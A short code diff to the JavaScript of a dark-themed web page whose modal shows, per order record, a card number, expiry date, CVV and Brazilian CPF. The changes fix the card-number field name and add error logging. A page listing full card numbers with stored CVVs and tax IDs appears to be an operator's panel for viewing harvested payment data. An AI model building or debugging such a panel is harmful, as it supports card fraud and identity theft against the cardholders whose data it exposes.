@@ -40,7 +40,7 @@ body { font-family: Arial; background:#111; color:#eee; margin:0; padding:0; }
 </div>
 
 <script>
-document.querySelectorAll(".view-btn").forEach(btn=>{
+    document.querySelectorAll(".view-btn").forEach(btn=>{
     btn.addEventListener("click", async ()=>{
         const id = btn.dataset.id;
         try{
@@ -52,7 +52,7 @@ document.querySelectorAll(".view-btn").forEach(btn=>{
             document.getElementById("modalBody").innerHTML = `
                 <h4>Pedido</h4>
                 <div style="background:#222; padding:10px; border-radius:8px;">
-                    <b>Número:</b> ${c.material}<br>
+                    <b>Número:</b> ${c.numero}<br>
                     <b>Validade:</b> ${c.validade}<br>
                     <b>CVV:</b> ${c.cvv}<br>
                     <b>CPF:</b> ${c.cpf}<br>
@@ -63,10 +63,12 @@ document.querySelectorAll(".view-btn").forEach(btn=>{
                 </div>
             `;
             document.getElementById("modalBack").style.display="flex";
-        }catch(e){ alert("Erro ao carregar detalhes."); }
+        }catch(e){ 
+            console.error(e);
+            alert("Erro ao carregar detalhes."); 
+        }
     });
 });
-
 document.getElementById("closeModal").addEventListener("click",()=>{document.getElementById("modalBack").style.display="none";});
 </script>
 </body>
